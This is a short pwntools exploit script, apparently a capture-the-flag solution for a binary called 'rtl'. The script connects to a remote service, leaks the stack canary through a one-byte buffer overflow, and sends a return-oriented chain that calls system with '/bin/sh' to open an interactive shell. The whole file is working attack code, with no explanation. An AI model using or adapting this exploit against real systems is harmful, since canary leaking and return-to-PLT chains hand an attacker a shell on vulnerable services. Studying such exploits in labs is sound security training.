from pwn import *
#p = process('./rtl')
p = remote(ADDRESS, PORT)
e = ELF('./rtl')
context.arch = 'amd64'
payload = b"A" * 0x39
p.sendafter(b"Buf: ", payload)
p.recvuntil(payload)
canary = u64(b"\x00" + p.recvn(7))
system_plt = e.plt["system"]
binsh = 0x400874
pop_rdi = 0x0000000000400853
payload = b"A" * 0x38 + p64(canary) + b"B" * 8 + p64(pop_rdi + 2) + p64(pop_rdi) + p64(binsh) + p64(system_plt)
p.sendafter(b"Buf: ", payload)
p.interactive()